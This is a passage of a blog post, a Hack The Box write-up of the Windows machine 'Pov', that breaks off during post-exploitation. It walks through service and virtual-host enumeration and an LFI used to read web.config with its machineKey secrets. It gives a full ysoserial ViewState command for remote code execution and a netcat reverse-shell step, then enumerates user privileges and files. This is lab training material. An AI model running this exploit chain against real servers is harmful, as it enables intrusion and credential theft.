<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Pov | PwndSide</title><meta name=keywords content="web,windows,serialized,wintokens"><meta name=description content="This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. "><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://pwndside.github.io/posts/pov-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://pwndside.github.io/posts/pov-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Pov"><meta property="og:description" content="This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-04T16:07:28+01:00"><meta property="article:modified_time" content="2024-02-04T16:07:28+01:00"><meta property="article:tag" content="Web"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Serialized"><meta property="article:tag" content="Wintokens"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Pov"><meta name=twitter:description content="This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. "><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Pov","item":"https://pwndside.github.io/posts/pov-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Pov","name":"Pov","description":"This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. ","keywords":["web","windows","serialized","wintokens"],"articleBody":"Room Information Room name: Pov Difficulty level: Medium Room link: https://app.hackthebox.com/machines/pov Port Scanning sudo nmap $IP -p- -n -Pn -vvv --min-rate 5000 -sCV PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: pov.htb |_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Port enumeration completed, only a open http port.\nEnumeration The site hasnt have any url redirection hovering at the buttons.\nAt the bottom of the page, we can see a leaked host dev.pov.htb, lets check if there are more than one vhost with ffuf.\nBut before we need to update our /etc/hosts file.\n## # Host Database # # localhost is used to configure the loopback interface # when the system is booting. Do not change this entry. ## 127.0.0.1 localhost 255.255.255.255 broadcasthost ::1 localhost 10.10.11.251 pov.htb ffuf -u http://10.10.14.150 -H \"Host: FUZZ.pov.htb\" -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -o vhost /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.251 :: Wordlist : FUZZ: /Users/ayman/Documents/hacking/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.pov.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response words: 3740,1,334 ________________________________________________ dev [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 309ms] Only dev is outputted.\nBefore moving to the new page found lets fuzz the current page for hidden directories.\ngobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://$IP -x php,py,html,js,css,txt,aspx -o gobuster /css (Status: 301) [Size: 147] [--\u003e http://10.10.11.251/css/] /img (Status: 301) [Size: 147] [--\u003e http://10.10.11.251/img/] /Index.html (Status: 200) [Size: 12330] /index.html (Status: 200) [Size: 12330] /index.html (Status: 200) [Size: 12330] /js (Status: 301) [Size: 146] [--\u003e http://10.10.11.251/js/] Nothing useful at this point, now lets see if we have better luck with the other site.\ngobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://dev.pov.htb/portfolio -x php,py,html,js,css,txt,aspx -b 404,302 -o gobuster As the site default page is located on portfolio I am fuzzing this directory instead of the root directory and as error 404 is redirected with 302 I decided to filter this status code, in order to have a clear vision of the output.\n/assets (Status: 301) [Size: 159] [--\u003e http://dev.pov.htb/portfolio/assets/] /contact.aspx (Status: 200) [Size: 4691] /Contact.aspx (Status: 200) [Size: 4691] /default.aspx (Status: 200) [Size: 21371] /Default.aspx (Status: 200) [Size: 21371] Exploiting Checking at default.aspx, we can see a button for downloading a CV, that got my attention so I tried to catch the download request.\nI found an LFI on the file prameter so I tried to read the web.config file.\nAfter many tries to read the content of web.config, I have been able to do it after changing the file value to /web.config\nOne curious thing is the fact that the POST request is sending serialized data with _VIEWSTATE.\nAfter searching info on google, I found a blog which explains that if we have access to the web.config and we can modify the value of _VIEWSTATE parameter with burp we can achieve RCE with ysoserial.exe.\nThe post gives the exact ysoserial command for each .NET version, also gives the commands if the server is using encryption/hashing.\n","wordCount":"1196","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2024-02-04T16:07:28+01:00","dateModified":"2024-02-04T16:07:28+01:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/pov-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;禄&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Pov</h1><div class=post-description>This time we are going to exploit a new seasonal machine called Pov, this is my first competitive machine and the first one which I have done after failing the OSCP exam, being one of the many I want to do before retaking it. In the end the effort will pay off. </div><div class=post-meta><span title='2024-02-04 16:07:28 +0100 CET'>February 4, 2024</span>&nbsp;路&nbsp;6 min&nbsp;路&nbsp;1196 words&nbsp;路&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/pov-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Pov</li><li>Difficulty level: Medium</li><li>Room link: <a href=https://app.hackthebox.com/machines/pov>https://app.hackthebox.com/machines/pov</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/pov-icon.png></p><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -p- -n -Pn -vvv --min-rate <span class=m>5000</span> -sCV
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON          VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>127</span> Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Supported Methods: OPTIONS TRACE GET HEAD POST
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: pov.htb
</span></span><span class=line><span class=cl><span class=p>|</span>_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>Port enumeration completed, <strong>only a open http port</strong>.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/pov-1.png></p><p>The site hasnt have any url redirection hovering at the buttons.</p><p><img alt=Untitled loading=lazy src=/HTB/pov-2.png></p><p>At the bottom of the page, we can see a leaked host <code>dev.pov.htb</code>, lets <strong>check</strong> if there are more than one <strong>vhost with ffuf</strong>.</p><p>But before we need to update our <code>/etc/hosts</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>##</span>
</span></span><span class=line><span class=cl><span class=c1># Host Database</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># localhost is used to configure the loopback interface</span>
</span></span><span class=line><span class=cl><span class=c1># when the system is booting.  Do not change this entry.</span>
</span></span><span class=line><span class=cl><span class=c1>##</span>
</span></span><span class=line><span class=cl>127.0.0.1       localhost
</span></span><span class=line><span class=cl>255.255.255.255 broadcasthost
</span></span><span class=line><span class=cl>::1             localhost
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>10.10.11.251    pov.htb
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://10.10.14.150 -H <span class=s2>&#34;Host: FUZZ.pov.htb&#34;</span> -w ~/Documents/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -o vhost
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v2.1.0-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://10.10.11.251
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /Users/ayman/Documents/hacking/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span class=line><span class=cl> :: Header           : Host: FUZZ.pov.htb
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: all
</span></span><span class=line><span class=cl> :: Filter           : Response words: 3740,1,334
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>dev                     <span class=o>[</span>Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 309ms<span class=o>]</span>
</span></span></code></pre></div><p>Only <code>dev</code> is outputted.</p><p>Before moving to the new page found lets <strong>fuzz</strong> the current page for <strong>hidden directories</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://<span class=nv>$IP</span> -x php,py,html,js,css,txt,aspx -o gobuster
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 147<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.251/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 147<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.251/img/<span class=o>]</span>
</span></span><span class=line><span class=cl>/Index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 12330<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 12330<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 12330<span class=o>]</span>
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 146<span class=o>]</span> <span class=o>[</span>--&gt; http://10.10.11.251/js/<span class=o>]</span>
</span></span></code></pre></div><p>Nothing useful at this point, now lets see if we have better luck with the other site.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -w ~/Documents/hacking/wordlists/KaliLists/dirb/common.txt -u http://dev.pov.htb/portfolio -x php,py,html,js,css,txt,aspx -b 404,302 -o gobuster
</span></span></code></pre></div><p>As the site <strong>default page</strong> is located on <strong>portfolio</strong> I am fuzzing this directory instead of the <strong>root directory</strong> and as <strong>error 404</strong> is redirected with <strong>302</strong> I decided to filter this status code, in order to have a <strong>clear vision</strong> of the output.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/assets               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 159<span class=o>]</span> <span class=o>[</span>--&gt; http://dev.pov.htb/portfolio/assets/<span class=o>]</span>
</span></span><span class=line><span class=cl>/contact.aspx         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4691<span class=o>]</span>
</span></span><span class=line><span class=cl>/Contact.aspx         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4691<span class=o>]</span>
</span></span><span class=line><span class=cl>/default.aspx         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 21371<span class=o>]</span>
</span></span><span class=line><span class=cl>/Default.aspx         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 21371<span class=o>]</span>
</span></span></code></pre></div><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/pov-3.png></p><p>Checking at <code>default.aspx</code>, we can see a button for downloading a CV, that got my attention so I tried to catch the download request.</p><p><img alt=Untitled loading=lazy src=/HTB/pov-4.png></p><p>I found an <strong>LFI</strong> on the <strong>file prameter</strong> so I tried to read the <code>web.config</code> file.</p><p><img alt=Untitled loading=lazy src=/HTB/pov-5.png></p><p><img alt=Untitled loading=lazy src=/HTB/pov-6.png></p><p>After many tries to read the content of <code>web.config</code>, I have been able to do it after <strong>changing the file value</strong> to <code>/web.config</code></p><p>One curious thing is the fact that the <strong>POST request</strong> is sending serialized data with <code>_VIEWSTATE</code>.</p><p>After searching info on google, I found a <a href=https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter>blog</a> which explains that if we have access to the <code>web.config</code> and we can modify the value of <code>_VIEWSTATE</code> parameter with burp we can achieve <strong>RCE with ysoserial.exe</strong>.</p><p>The post gives the exact <strong>ysoserial</strong> command for each <strong>.NET version</strong>, also gives the commands if the server is using <strong>encryption/hashing.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;configuration&gt;
</span></span><span class=line><span class=cl>  &lt;system.web&gt;
</span></span><span class=line><span class=cl>    &lt;customErrors <span class=nv>mode</span><span class=o>=</span><span class=s2>&#34;On&#34;</span> <span class=nv>defaultRedirect</span><span class=o>=</span><span class=s2>&#34;default.aspx&#34;</span> /&gt;
</span></span><span class=line><span class=cl>    &lt;httpRuntime <span class=nv>targetFramework</span><span class=o>=</span><span class=s2>&#34;4.5&#34;</span> /&gt;
</span></span><span class=line><span class=cl>    &lt;machineKey <span class=nv>decryption</span><span class=o>=</span><span class=s2>&#34;AES&#34;</span> <span class=nv>decryptionKey</span><span class=o>=</span><span class=s2>&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> <span class=nv>validation</span><span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> <span class=nv>validationKey</span><span class=o>=</span><span class=s2>&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> /&gt;
</span></span><span class=line><span class=cl>  &lt;/system.web&gt;
</span></span><span class=line><span class=cl>    &lt;system.webServer&gt;
</span></span><span class=line><span class=cl>        &lt;httpErrors&gt;
</span></span><span class=line><span class=cl>            &lt;remove <span class=nv>statusCode</span><span class=o>=</span><span class=s2>&#34;403&#34;</span> <span class=nv>subStatusCode</span><span class=o>=</span><span class=s2>&#34;-1&#34;</span> /&gt;
</span></span><span class=line><span class=cl>            &lt;error <span class=nv>statusCode</span><span class=o>=</span><span class=s2>&#34;403&#34;</span> <span class=nv>prefixLanguageFilePath</span><span class=o>=</span><span class=s2>&#34;&#34;</span> <span class=nv>path</span><span class=o>=</span><span class=s2>&#34;http://dev.pov.htb:8080/portfolio&#34;</span> <span class=nv>responseMode</span><span class=o>=</span><span class=s2>&#34;Redirect&#34;</span> /&gt;
</span></span><span class=line><span class=cl>        &lt;/httpErrors&gt;
</span></span><span class=line><span class=cl>        &lt;httpRedirect <span class=nv>enabled</span><span class=o>=</span><span class=s2>&#34;true&#34;</span> <span class=nv>destination</span><span class=o>=</span><span class=s2>&#34;http://dev.pov.htb/portfolio&#34;</span> <span class=nv>exactDestination</span><span class=o>=</span><span class=s2>&#34;false&#34;</span> <span class=nv>childOnly</span><span class=o>=</span><span class=s2>&#34;true&#34;</span> /&gt;
</span></span><span class=line><span class=cl>    &lt;/system.webServer&gt;
</span></span><span class=line><span class=cl>&lt;/configuration&gt;
</span></span></code></pre></div><p>As our <strong>.NET version is 4.5</strong> and we have the <strong>decryption key/alg</strong> and <strong>validation key/alg</strong> lets use the following comand.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.<span class=se>\y</span>soserial.exe -p ViewState  -g TextFormattingRunProperties -c <span class=s2>&#34;COMMAND&#34;</span> --path<span class=o>=</span><span class=s2>&#34;/portfolio&#34;</span> --apppath<span class=o>=</span><span class=s2>&#34;/&#34;</span> --decryptionalg<span class=o>=</span><span class=s2>&#34;AES&#34;</span> --decryptionkey<span class=o>=</span><span class=s2>&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span>  --validationalg<span class=o>=</span><span class=s2>&#34;SHA1&#34;</span> --validationkey<span class=o>=</span><span class=s2>&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span>
</span></span></code></pre></div><p>As the command is using a .<strong>exe binnary</strong> we need a <strong>Windows VM</strong> to execute it.</p><p>Now, only rest setting a <strong>nc listener</strong>, execute <strong>ysoserial</strong> with a <strong>powershell rev shell</strong> and sending the ysoserial output in the <strong>_VIEWSTATE value</strong> of the request.</p><p><img alt=Untitled loading=lazy src=/HTB/pov-7.png></p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/pov-8.png></p><p>We entered as <code>pov\sfitz</code> , lets check his current <strong>privileges</strong> and groups</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>whoami</span> <span class=p>/</span><span class=n>priv</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PRIVILEGES INFORMATION
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Privilege Name                Description                    <span class=nv>State</span>   
</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>==============================</span> <span class=o>========</span>
</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working <span class=nb>set</span> Disabled
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>whoami</span> <span class=p>/</span><span class=n>groups</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GROUP INFORMATION
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Group Name                             Type             SID                                                           <span class=nv>Attributes</span>                                        
</span></span><span class=line><span class=cl><span class=o>======================================</span> <span class=o>================</span> <span class=o>=============================================================</span> <span class=o>==================================================</span>
</span></span><span class=line><span class=cl>Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\U</span>sers                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\B</span>ATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\A</span>uthenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\T</span>his Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\L</span>ocal account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\I</span>IS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>IIS APPPOOL<span class=se>\d</span>ev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\N</span>TLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>Mandatory Label<span class=se>\M</span>edium Mandatory Level Label            S-1-16-8192
</span></span></code></pre></div><p>Nothing seems relevant here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-ChildItem</span> <span class=n>-Path</span> <span class=p>/</span><span class=n>Users</span> <span class=n>-Include</span> <span class=p>*</span> <span class=o>-File</span> <span class=n>-Recurse</span> <span class=n>-ErrorAction</span> <span class=n>SilentlyContinue</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/pov-9.png></p><p>Enumerating files on <code>/Users</code> folder, shows me a file named <strong>connection.xml</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>&lt;</span><span class=n>Objs</span> <span class=n>Version</span><span class=p>=</span><span class=s2>&#34;1.1.0.1&#34;</span> <span class=n>xmlns</span><span class=p>=</span><span class=s2>&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=n>Obj</span> <span class=n>RefId</span><span class=p>=</span><span class=s2>&#34;0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=n>TN</span> <span class=n>RefId</span><span class=p>=</span><span class=s2>&#34;0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=n>T</span><span class=p>&gt;</span><span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=n>PSCredential</span><span class=p>&lt;/</span><span class=n>T</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=n>T</span><span class=p>&gt;</span><span class=n>System</span><span class=p>.</span><span class=n>Object</span><span class=p>&lt;/</span><span class=n>T</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=n>TN</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=n>ToString</span><span class=p>&gt;</span><span class=n>System</span><span class=p>.</span><span class=py>Management</span><span class=p>.</span><span class=py>Automation</span><span class=p>.</span><span class=n>PSCredential</span><span class=p>&lt;/</span><span class=n>ToString</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=n>Props</span><span class=p>&gt;</span>
